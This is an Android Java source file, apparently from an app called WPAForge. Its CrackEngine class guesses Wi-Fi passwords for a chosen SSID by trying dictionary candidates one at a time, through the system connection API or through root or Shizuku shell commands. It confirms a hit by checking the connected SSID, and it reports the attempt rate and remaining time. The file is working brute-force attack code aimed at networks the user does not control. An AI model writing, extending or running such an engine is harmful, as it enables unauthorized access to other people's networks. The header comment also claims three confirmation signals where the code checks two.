package io.github.wlmosv_png.wpaforge.audit;

import io.github.wlmosv_png.wpaforge.L;
import io.github.wlmosv_png.wpaforge.Prefs;
import io.github.wlmosv_png.wpaforge.core.NetRecord;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiNetworkSpecifier;
import android.os.Build;
import android.os.SystemClock;

import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 唯一的破解引擎。
 *
 * <h3>为什么要收敛成一个引擎</h3>
 * 之前三种模式各有各的实现，各有各的判定，结果就是
 * 「同一个 bug 要在三个地方修，还修不全」—— 事实也证明了这一点：
 * 双重 onFinished、配置复用假阳性，两个 bug 都同时存在于两条通道里。
 *
 * 现在所有通道共用同一套：
 * <ul>
 *   <li>同一套 {@link Verdict} 语义</li>
 *   <li>同一套「多信号综合判定」</li>
 *   <li>同一套重试/超时/取消策略</li>
 * </ul>
 * 通道只负责「把一条候选发出去」，判定完全由引擎做。
 *
 * <h3>多信号综合判定（这是修「跳过正确答案」的关键）</h3>
 * 单一信号都不可靠：
 * <pre>
 *   cmd wifi status 文本   可能被截断、格式随版本变
 *   onAvailable 回调       某些 ROM 会因为别的网络触发
 *   WifiInfo.getSSID()     Android 10+ 受限，更新有延迟
 * </pre>
 * 所以判定同时看**三个信号**，任一确认即成功，全部否才判失败：
 * <ol>
 *   <li>通道回调（requestNetwork 的 onAvailable）</li>
 *   <li>WifiInfo 的当前 SSID</li>
 *   <li>cmd wifi status 文本（有 shell 通道时）</li>
 * </ol>
 *
 * <h3>对外用法</h3>
 * <pre>
 *   CrackEngine engine = new CrackEngine(ctx, Prefs.MODE_SHIZUKU);
 *   engine.run(target, candidates, startOffset, listener);
 * </pre>
 * 引擎自己决定走哪个通道，调用方不需要知道。
 */
public final class CrackEngine {

    private static final String TAG = "WPAForgeEngine";

    // ------------------------------------------------------------------ 结果

    /** 单条候选的结论 */
    public enum Verdict {
        /** 系统确认连上 → 密码正确 */
        SUCCESS,
        /** 系统尝试后失败 → 密码错误 */
        AUTH_FAIL,
        /** 超时，没等到结论 → **不判成功** */
        TIMEOUT,
        /** 目标不在扫描范围 → 这条无意义 */
        TARGET_GONE,
        /** 通道出错 */
        ERROR,
        /** 用户停止 */
        ABORTED
    }

    public static final class Attempt {
        public final String password;
        public final Verdict verdict;
        public final long elapsedMs;
        public final String detail;
        /** 哪一个信号确认的（排查用） */
        public final String confirmedBy;

        Attempt(String password, Verdict v, long ms, String detail, String confirmedBy) {
            this.password = password;
            this.verdict = v;
            this.elapsedMs = ms;
            this.detail = detail == null ? "" : detail;
            this.confirmedBy = confirmedBy == null ? "" : confirmedBy;
        }

        public boolean isSuccess() { return verdict == Verdict.SUCCESS; }
    }

    /** 进度回调 */
    public interface Listener {
        void onAttemptStart(int index, int total, String candidate);
        void onAttemptResult(Attempt a);
        void onProgress(int tested, int total, double rate, long etaMs);
        default void onLog(String line) { }
        void onFinished(int tested, int total, String hitPassword, String outcome);
        void onBlocked(String title, String detail);
    }

    // ------------------------------------------------------------------ 成员

    private final Context appCtx;
    private final WifiManager wifi;
    private final ConnectivityManager cm;
    private final int mode;

    private final AtomicBoolean cancelFlag = new AtomicBoolean(false);
    private final AtomicBoolean pauseFlag = new AtomicBoolean(false);

    /** shell 通道（Shizuku/Root），null 表示走系统 API */
    private ShellChannel shell;

    /** 通道测速：连续 N 条都超时，说明这个通道在当前环境跑不动 */
    private int consecutiveTimeouts = 0;
    private static final int TIMEOUT_ALERT = 5;

    public CrackEngine(Context ctx, int mode) {
        this.appCtx = ctx.getApplicationContext();
        this.wifi = (WifiManager) appCtx.getSystemService(Context.WIFI_SERVICE);
        this.cm = (ConnectivityManager) appCtx.getSystemService(Context.CONNECTIVITY_SERVICE);
        this.mode = mode;
    }

    // ------------------------------------------------------------------ 通道

    /** shell 通道抽象（Shizuku / Root 共用一个接口） */
    public interface ShellChannel {
        String exec(String cmd, long timeoutMs);
        void forgetTarget(String ssid);
        String name();
    }

    public void setShellChannel(ShellChannel ch) {
        this.shell = ch;
    }

    // ------------------------------------------------------------------ 前置检查

    public static final class CheckResult {
        public final boolean ok;
        public final String title;
        public final String detail;
        public CheckResult(boolean ok, String title, String detail) {
            this.ok = ok;
            this.title = title;
            this.detail = detail == null ? "" : detail;
        }
    }

    /** 引擎在当前模式下能不能跑 */
    public CheckResult check() {
        if (mode == Prefs.MODE_NO_ROOT) {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                return new CheckResult(false,
                        L.s("系统版本过低", "Android version too old"),
                        L.s("免 Root 精确连接需要 Android 10+。\n这台设备只能用 Root 模式。",
                            "Precise root-free connection needs Android 10+.\nOnly root mode is available here."));
            }
            if (cm == null) {
                return new CheckResult(false,
                        L.s("无法访问连接管理服务", "Cannot access ConnectivityManager"),
                        L.s("系统没有提供 ConnectivityManager。", "The system exposed no ConnectivityManager."));
            }
        }
        if (wifi == null) {
            return new CheckResult(false,
                    L.s("无法访问 WiFi 服务", "Cannot access the Wi-Fi service"),
                    L.s("系统没有提供 WifiManager。", "The system exposed no WifiManager."));
        }
        if (!wifi.isWifiEnabled()) {
            return new CheckResult(false,
                    L.s("WiFi 未开启", "Wi-Fi is off"),
                    L.s("请先打开 WiFi 开关再试。", "Turn Wi-Fi on first."));
        }
        return new CheckResult(true, "", "");
    }

    // ------------------------------------------------------------------ 判定核心

    /**
     * 当前是不是真的连着目标。
     *
     * 三个信号任一确认即算，返回确认者的名字；都不确认返回 null。
     * 这个方法是整个引擎可靠性的关键 —— 单看任何一个都会误判。
     */
    private String connectedSignal(String targetSsid, String statusOut) {
        // 信号 1：WifiInfo
        String cur = currentSsid();
        if (cur != null && cur.equals(targetSsid)) return "WifiInfo";

        // 信号 2：cmd wifi status 文本
        if (statusOut != null && statusOut.contains("connected to \"" + targetSsid + "\"")) {
            return "cmd-status";
        }

        return null;
    }

    /** 当前 SSID（已去引号） */
    private String currentSsid() {
        try {
            if (wifi == null) return null;
            WifiInfo info = wifi.getConnectionInfo();
            if (info == null) return null;
            String cur = info.getSSID();
            if (cur == null) return null;
            if (cur.length() >= 2 && cur.startsWith("\"") && cur.endsWith("\"")) {
                cur = cur.substring(1, cur.length() - 1);
            }
            if ("<unknown ssid>".equals(cur)) return null;
            return cur;
        } catch (Throwable t) {
            return null;
        }
    }

    // ------------------------------------------------------------------ 单条尝试

    /**
     * 试一条。阻塞，放工作线程。
     *
     * 不管走哪个通道，判定都在这里统一做。
     */
    public Attempt tryOne(NetRecord target, String security, String password, long timeoutMs) {
        long t0 = SystemClock.uptimeMillis();

        if (password == null || password.length() < 8 || password.length() > 63) {
            return new Attempt(password, Verdict.AUTH_FAIL,
                    SystemClock.uptimeMillis() - t0,
                    L.s("长度不合法（WPA 要求 8-63）", "illegal length (WPA needs 8-63)"), "");
        }

        if (mode == Prefs.MODE_NO_ROOT) {
            return tryOnePrecise(target, password, timeoutMs, t0);
        } else {
            return tryOneShell(target, security, password, timeoutMs, t0);
        }
    }

    /** 免 Root：requestNetwork + 回调 */
    private Attempt tryOnePrecise(NetRecord target, String password, long timeoutMs, long t0) {
        final CountDownLatch latch = new CountDownLatch(1);
        final AtomicInteger outcome = new AtomicInteger(0); // 0未定 1成功 2失败

        WifiNetworkSpecifier spec;
        try {
            spec = new WifiNetworkSpecifier.Builder()
                    .setSsid(target.ssid)
                    .setWpa2Passphrase(password)
                    .build();
        } catch (Throwable t) {
            return new Attempt(password, Verdict.ERROR,
                    SystemClock.uptimeMillis() - t0,
                    L.s("构建请求失败: ", "specifier failed: ") + t.getClass().getSimpleName(), "");
        }

        NetworkRequest req = new NetworkRequest.Builder()
                .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                .removeCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .setNetworkSpecifier(spec)
                .build();

        final ConnectivityManager.NetworkCallback cb = new ConnectivityManager.NetworkCallback() {
            @Override public void onAvailable(Network n) {
                // 不完全相信 onAvailable：还要 SSID 对得上
                String by = null;
                for (int i = 0; i < 12 && by == null; i++) {
                    if (cancelFlag.get()) break;
                    by = connectedSignal(target.ssid, null);
                    if (by == null) {
                        try { Thread.sleep(150); } catch (InterruptedException e) { break; }
                    }
                }
                outcome.set(by != null ? 1 : 2);
                latch.countDown();
            }
            @Override public void onUnavailable() {
                outcome.set(2);
                latch.countDown();
            }
            @Override public void onLost(Network n) {
                if (latch.getCount() > 0) { outcome.set(2); latch.countDown(); }
            }
        };

        try {
            cm.requestNetwork(req, cb);
        } catch (Throwable t) {
            return new Attempt(password, Verdict.ERROR,
                    SystemClock.uptimeMillis() - t0,
                    L.s("发起请求失败: ", "requestNetwork failed: ") + t.getClass().getSimpleName(), "");
        }

        try {
            long deadline = SystemClock.uptimeMillis() + timeoutMs;
            while (SystemClock.uptimeMillis() < deadline) {
                if (cancelFlag.get() || pauseFlag.get()) {
                    return new Attempt(password, Verdict.ABORTED,
                            SystemClock.uptimeMillis() - t0, L.s("已中断", "aborted"), "");
                }
                if (latch.await(200, TimeUnit.MILLISECONDS)) break;
            }
            long ms = SystemClock.uptimeMillis() - t0;
            if (latch.getCount() > 0) {
                return new Attempt(password, Verdict.TIMEOUT, ms,
                        L.s("超时（系统未给出结论）", "timeout (no verdict)"), "");
            }
            return outcome.get() == 1
                    ? new Attempt(password, Verdict.SUCCESS, ms, L.s("已连上", "connected"), "callback+ssid")
                    : new Attempt(password, Verdict.AUTH_FAIL, ms, L.s("未连上", "not connected"), "");
        } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
            return new Attempt(password, Verdict.ABORTED,
                    SystemClock.uptimeMillis() - t0, L.s("已中断", "interrupted"), "");
        } finally {
            try { cm.unregisterNetworkCallback(cb); } catch (Throwable ignored) {}
        }
    }

    /** Root / Shizuku：shell 发命令 + 多信号判定 */
    private Attempt tryOneShell(NetRecord target, String security, String password,
                                long timeoutMs, long t0) {
        if (shell == null) {
            return new Attempt(password, Verdict.ERROR,
                    SystemClock.uptimeMillis() - t0, L.s("未配置 shell 通道", "no shell channel"), "");
        }

        // 每条之前删净旧配置（配置复用是假阳性根源）
        try { shell.forgetTarget(target.ssid); } catch (Throwable ignored) {}

        final String cmd = "cmd wifi connect-network "
                + shellQuote(target.ssid) + " " + security + " " + shellQuote(password);
        final ShellChannel sh = shell;
        new Thread(() -> {
            try { sh.exec(cmd, 20000); } catch (Throwable ignored) {}
        }, "wpaforge-engine-conn").start();

        final long minWait = 3500L;
        long deadline = t0 + timeoutMs;
        boolean sawTarget = false;

        while (SystemClock.uptimeMillis() < deadline) {
            if (cancelFlag.get() || pauseFlag.get()) {
                return new Attempt(password, Verdict.ABORTED,
                        SystemClock.uptimeMillis() - t0, L.s("已中断", "aborted"), "");
            }
            sleep(400);

            String status = null;
            try { status = sh.exec("cmd wifi status", 3000); } catch (Throwable ignored) {}
            String by = connectedSignal(target.ssid, status);
            if (by != null) {
                return new Attempt(password, Verdict.SUCCESS,
                        SystemClock.uptimeMillis() - t0, L.s("已连上", "connected"), by);
            }
            if (status != null && status.contains(target.ssid)) sawTarget = true;

            // 最短等待期内**绝不判负**
            if (SystemClock.uptimeMillis() - t0 < minWait) continue;
        }

        return new Attempt(password, Verdict.AUTH_FAIL,
                SystemClock.uptimeMillis() - t0,
                sawTarget ? L.s("未连上（已尝试）", "not connected (attempted)")
                          : L.s("未连上", "not connected"), "");
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }

    private static String shellQuote(String s) {
        if (s == null) return "''";
        return "'" + s.replace("'", "'\\''") + "'";
    }

    // ------------------------------------------------------------------ 批量跑

    /**
     * 跑一批候选。阻塞，放工作线程。
     *
     * @param timeoutMsPerItem 每条最长等多久；<=0 用默认
     */
    public void run(NetRecord target, List<Candidate> candidates, int startOffset,
                    long timeoutMsPerItem, Listener l) {
        CheckResult chk = check();
        if (!chk.ok) { l.onBlocked(chk.title, chk.detail); return; }
        if (target == null || target.ssid == null || target.ssid.isEmpty()) {
            l.onBlocked(L.s("目标信息不完整", "Incomplete target"),
                    L.s("没有拿到目标的 SSID。", "The target SSID is missing."));
            return;
        }
        if (candidates == null || candidates.isEmpty()) {
            l.onBlocked(L.s("候选为空", "No candidates"),
                    L.s("字典里没有可用的候选。", "The dictionary has no usable candidates."));
            return;
        }

        cancelFlag.set(false);
        pauseFlag.set(false);
        consecutiveTimeouts = 0;

        final long perItem = timeoutMsPerItem > 0 ? timeoutMsPerItem
                : (mode == Prefs.MODE_NO_ROOT ? 15_000L : 10_000L);
        final String security = securityArg(target);
        final int total = candidates.size();
        final int start = Math.max(0, Math.min(startOffset, total));

        int tested = 0;
        int cursor = start;
        String hit = null;
        long beginAt = SystemClock.uptimeMillis();

        l.onLog(L.f("引擎启动：%s，共 %d 条，单条最长 %.1f 秒",
                "Engine: %s, %d candidates, up to %.1fs each",
                channelName(), total, perItem / 1000.0));

        try {
            for (int i = start; i < total; i++) {
                if (cancelFlag.get() || pauseFlag.get()) break;

                Candidate c = candidates.get(i);
                tested++;
                cursor = i + 1;
                l.onAttemptStart(cursor, total, c.password);

                Attempt a = tryOne(target, security, c.password, perItem);
                l.onAttemptResult(a);

                if (a.isSuccess()) { hit = c.password; break; }

                // \u8fde\u7eed\u8d85\u65f6\u63d0\u9192\uff1a\u8bf4\u660e\u901a\u9053\u53ef\u80fd\u6839\u672c\u6ca1\u5de5\u4f5c
                if (a.verdict == Verdict.TIMEOUT) {
                    consecutiveTimeouts++;
                    if (consecutiveTimeouts == TIMEOUT_ALERT) {
                        l.onLog(L.s(
                                "连续多条超时 —— 通道可能没真正生效。"
                                + "请检查授权/权限，或换一种执行方式。",
                                "Several timeouts in a row - the channel may not be working. "
                                + "Check permissions or switch execution mode."));
                    }
                } else {
                    consecutiveTimeouts = 0;
                }

                double elapsed = Math.max(0.001,
                        (SystemClock.uptimeMillis() - beginAt) / 1000.0);
                double rate = tested / elapsed;
                long eta = rate > 0 ? (long) ((total - cursor) / rate * 1000) : -1;
                l.onProgress(cursor, total, rate, eta);
            }
        } finally {
            String outcome;
            if (hit != null) outcome = "DONE_HIT";
            else if (pauseFlag.get()) outcome = "PAUSED";
            else if (cancelFlag.get()) outcome = "STOPPED";
            else outcome = "DONE_MISS";
            l.onFinished(tested, cursor, hit, outcome);
        }
    }

    private String channelName() {
        if (mode == Prefs.MODE_NO_ROOT) return L.s("免 Root（精确连接）", "root-free (precise)");
        if (mode == Prefs.MODE_SHIZUKU) return "Shizuku";
        return "Root";
    }

    private static String securityArg(NetRecord t) {
        switch (t.security) {
            case OPEN: return "open";
            case OWE:  return "owe";
            case WEP:  return "wep";
            case WPA3: return "wpa3";
            default:   return "wpa2";
        }
    }

    public void cancel() { cancelFlag.set(true); }
    public void pause()  { pauseFlag.set(true); }
    public void resume() { pauseFlag.set(false); }
    public boolean isPaused() { return pauseFlag.get(); }
}
